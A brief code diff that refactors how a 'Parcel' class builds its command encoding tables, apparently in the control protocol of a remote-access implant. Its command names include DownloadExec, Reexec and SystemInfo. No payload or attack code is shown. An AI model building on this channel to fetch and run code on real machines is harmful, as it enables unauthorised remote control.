@@ -1165,7 +1165,7 @@ class Parcel(object):
 
     # Explicitly define commands. In other case make break something
 
-    COMMANDS = (
+    commands_encode, commands_decode = generate_encoding_tables(
         Poll, Ack, Policy, Idle, Kex,
         Connect, PasteLink, SystemInfo, Error, Disconnect, Exit,
         Sleep, Reexec, DownloadExec, CheckConnect, SystemStatus,
@@ -1173,13 +1173,11 @@ class Parcel(object):
         PortQuizPort, PupyState, CustomEvent
     )
 
-    commands_encode, commands_decode = generate_encoding_tables(*COMMANDS)
-
     def __init__(self, *commands):
 
-        if not all((type(command) in self.COMMANDS) for command in commands):
+        if not all((type(command) in self.commands_encode) for command in commands):
             missing = [
-                command for command in commands if not type(command) in self.COMMANDS
+                command for command in commands if not type(command) in self.commands_encode
             ]
             raise ParcelInvalidCommand(missing)
 
